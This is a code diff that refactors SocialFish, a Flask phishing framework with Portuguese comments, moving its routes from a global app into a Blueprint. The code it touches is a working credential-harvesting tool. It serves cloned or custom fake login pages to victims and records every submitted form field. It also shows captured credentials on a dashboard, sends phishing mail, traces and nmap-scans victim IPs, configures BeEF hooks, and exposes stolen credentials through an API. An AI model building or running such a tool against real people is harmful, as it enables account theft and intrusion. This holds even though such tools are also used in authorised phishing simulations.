@@ -1,5 +1,5 @@
-from flask import Flask, request, render_template, jsonify, redirect, g, flash
-from .core.config import *
+from flask import Flask, request, render_template, jsonify, redirect, g, flash, Blueprint, current_app
+from flask.cli import with_appcontext
 from .core.view import head
 from .core.scansf import nScan
 from .core.clonesf import clone
@@ -12,31 +12,24 @@ from .core.genReport import genReport
 from .core.report import generate_unique #>> new line
 from datetime import date
 from sys import argv, exit, version_info
+
+from .auth import login_manager, User, users
 import colorama
 import sqlite3
 import flask_login
 import os
 
-# Verificar argumentos
-if len(argv) < 2:
-    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
-    exit(0)
 
-# Temporario
-users = {argv[1]: {'password': argv[2]}}
-
-# Definicoes do flask
-app = Flask(__name__, static_url_path='', 
-            static_folder='templates/static')
-app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
+socialbp = Blueprint('socialbp', __name__)
 
 # Inicia uma conexao com o banco antes de cada requisicao
-@app.before_request
+@socialbp.before_request
 def before_request():
+    DATABASE = current_app.config['DATABASE']
     g.db = sqlite3.connect(DATABASE)
 
 # Finaliza a conexao com o banco apos cada conexao
-@app.teardown_request
+@socialbp.teardown_request
 def teardown_request(exception):
     if hasattr(g, 'db'):
         g.db.close()
@@ -65,14 +58,7 @@ def countNotPickedUp():
 
 #----------------------------------------
 
-# definicoes do flask e de login
-app.secret_key = APP_SECRET_KEY
-login_manager = flask_login.LoginManager()
-login_manager.init_app(app)
-
-class User(flask_login.UserMixin):
-    pass
-
+# definicoes de login
 @login_manager.user_loader
 def user_loader(email):
     if email not in users:
@@ -98,7 +84,7 @@ def request_loader(request):
 # ---------------------------------------------------------------------------------------
 
 # Rota para o caminho de inicializacao, onde e possivel fazer login
-@app.route('/neptune', methods=['GET', 'POST'])
+@socialbp.route('/neptune', methods=['GET', 'POST'])
 def admin():
     # se a requisicao for get
     if request.method == 'GET':        
@@ -129,7 +115,7 @@ def admin():
             return "bad"
 
 # funcao onde e realizada a renderizacao da pagina para a vitima
-@app.route("/")
+@socialbp.route("/")
 def getLogin():
     # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante
     if sta == 'clone':
@@ -152,7 +138,7 @@ def getLogin():
         return render_template('custom.html')
 
 # funcao onde e realizado o login por cada pagina falsa
-@app.route('/login', methods=['POST'])
+@socialbp.route('/login', methods=['POST'])
 def postData():
     if request.method == "POST":
         fields = [k for k in request.form]
@@ -171,7 +157,7 @@ def postData():
     return redirect(red)
 
 # funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
-@app.route('/configure', methods=['POST'])
+@socialbp.route('/configure', methods=['POST'])
 def echo():
     global url, red, sta, beef
     red = request.form['red']  
@@ -197,7 +183,7 @@ def echo():
     return redirect('/creds')
 
 # pagina principal do dashboard
-@app.route("/creds")
+@socialbp.route("/creds")
 @flask_login.login_required
 def getCreds():
     cur = g.db    
@@ -208,7 +194,7 @@ def getCreds():
     return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)
 
 # pagina para envio de emails
-@app.route("/mail", methods=['GET', 'POST'])
+@socialbp.route("/mail", methods=['GET', 'POST'])
 @flask_login.login_required
 def getMail():
     if request.method == 'GET':
@@ -234,7 +220,7 @@ def getMail():
         return redirect('/mail')
 
 # Rota para consulta de log 
-@app.route("/single/<id>", methods=['GET'])
+@socialbp.route("/single/<id>", methods=['GET'])
 @flask_login.login_required
 def getSingleCred(id):
     try:
@@ -249,7 +235,7 @@ def getSingleCred(id):
         return "Bad parameter"
 
 # rota para rastreio de ip
-@app.route("/trace/<ip>", methods=['GET'])
+@socialbp.route("/trace/<ip>", methods=['GET'])
 @flask_login.login_required
 def getTraceIp(ip):
     try:
@@ -259,13 +245,13 @@ def getTraceIp(ip):
         return "Network Error"
 
 # rota para scan do nmap
-@app.route("/scansf/<ip>", methods=['GET'])
+@socialbp.route("/scansf/<ip>", methods=['GET'])
 @flask_login.login_required
 def getScanSf(ip):
     return render_template('admin/scansf.html', nScan=nScan, ip=ip)   
 
 # rota post para revogar o token da api
-@app.route("/revokeToken", methods=['POST'])
+@socialbp.route("/revokeToken", methods=['POST'])
 @flask_login.login_required
 def revokeToken():
     revoke = request.form['revoke']
@@ -278,7 +264,7 @@ def revokeToken():
     return redirect('/creds')
 
 # pagina para gerar relatorios
-@app.route("/report", methods=['GET', 'POST'])
+@socialbp.route("/report", methods=['GET', 'POST'])
 @flask_login.login_required
 def getReport():
     if request.method == 'GET':
@@ -298,12 +284,13 @@ def getReport():
         date_range = request.form['datefilter']    
         target = request.form['selectTarget']
         _target = 'All' if target=='0' else target
+        DATABASE = current_app.config['DATABASE']
         genReport(DATABASE, subject, user, company, date_range, _target)
         generate_unique(DATABASE,_target)
         return redirect('/report')
 
 # pagina para cadastro de profissionais
-@app.route("/professionals", methods=['GET', 'POST'])
+@socialbp.route("/professionals", methods=['GET', 'POST'])
 @flask_login.login_required
 def getProfessionals():
     if request.method == 'GET':        
@@ -320,7 +307,7 @@ def getProfessionals():
         return redirect('/professionals')
 
 # pagina para cadastro de empresas
-@app.route("/companies", methods=['GET', 'POST'])
+@socialbp.route("/companies", methods=['GET', 'POST'])
 @flask_login.login_required
 def getCompanies():
     if request.method == 'GET':        
@@ -339,7 +326,7 @@ def getCompanies():
         return redirect('/companies')
 
 # rota para gerenciamento de usuarios
-@app.route("/sfusers/", methods=['GET'])
+@socialbp.route("/sfusers/", methods=['GET'])
 @flask_login.login_required
 def getSfUsers():
     return render_template('admin/sfusers.html')   
@@ -347,7 +334,7 @@ def getSfUsers():
 #--------------------------------------------------------------------------------------------------------------------------------
 #LOGIN VIEWS
 
-@app.route('/logout')
+@socialbp.route('/logout')
 def logout():
     flask_login.logout_user()
     return 'Logged out'
@@ -360,7 +347,7 @@ def unauthorized_handler():
 # MOBILE API
 
 # VERIFICAR CHAVE 
-@app.route("/api/checkKey/<key>", methods=['GET'])
+@socialbp.route("/api/checkKey/<key>", methods=['GET'])
 def checkKey(key):
     cur = g.db
     tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]    
@@ -370,7 +357,7 @@ def checkKey(key):
         status = {'status':'bad'}
     return jsonify(status)
 
-@app.route("/api/statistics/<key>", methods=['GET'])
+@socialbp.route("/api/statistics/<key>", methods=['GET'])
 def getStatics(key):    
     cur = g.db
     tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]    
@@ -385,7 +372,7 @@ def getStatics(key):
         info = {'status':'bad'}
     return jsonify(info)
 
-@app.route("/api/getJson/<key>", methods=['GET'])
+@socialbp.route("/api/getJson/<key>", methods=['GET'])
 def getJson(key): 
     cur = g.db
     tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]       
@@ -408,7 +395,7 @@ def getJson(key):
         credInfo = {'status':'bad'}
         return jsonify(credInfo)
 
-@app.route('/api/configure', methods = ['POST'])
+@socialbp.route('/api/configure', methods = ['POST'])
 def postConfigureApi():
     global url, red, sta, beef
     if request.is_json:
@@ -444,7 +431,7 @@ def postConfigureApi():
         status = {'status':'bad'}
     return jsonify(status)
 
-@app.route("/api/mail", methods=['POST'])
+@socialbp.route("/api/mail", methods=['POST'])
 def postSendMail():
     if request.is_json:
         content = request.get_json()
@@ -473,7 +460,7 @@ def postSendMail():
         status = {'status':'bad'}        
     return jsonify(status)
 
-@app.route("/api/trace/<key>/<ip>", methods=['GET'])
+@socialbp.route("/api/trace/<key>/<ip>", methods=['GET'])
 def getTraceIpMob(key, ip):
     cur = g.db
     tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]  
@@ -488,7 +475,7 @@ def getTraceIpMob(key, ip):
         content = {'status':'bad'}
         return jsonify(content)
 
-@app.route("/api/scansf/<key>/<ip>", methods=['GET'])
+@socialbp.route("/api/scansf/<key>/<ip>", methods=['GET'])
 def getScanSfMob(key, ip):
     cur = g.db
     tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]  
@@ -498,7 +485,7 @@ def getScanSfMob(key, ip):
         content = {'status':'bad'}
         return jsonify(content)        
 
-@app.route("/api/infoReport/<key>", methods=['GET'])
+@socialbp.route("/api/infoReport/<key>", methods=['GET'])
 def getReportMob(key):
     cur = g.db
     tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]  
